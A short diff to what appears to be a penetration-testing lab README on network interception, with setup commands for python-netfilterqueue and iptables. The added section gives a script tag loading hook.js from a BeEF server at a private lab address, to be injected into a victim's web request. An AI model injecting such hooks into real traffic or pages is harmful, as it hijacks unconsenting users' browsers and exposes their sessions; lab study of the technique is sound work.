@@ -26,3 +26,9 @@ pip3 install -U git+https://github.com/kti/python-netfilterqueue
 sudo pip3 install -U git+https://github.com/kti/python-netfilterqueue
 sudo iptables --flush
 ```
+## BeEF Framework
+Injecting 
+```
+<script src="http://10.0.2.10:3000/hook.js"></script>
+```
+inside the victim request we will be able to BeEF the browser
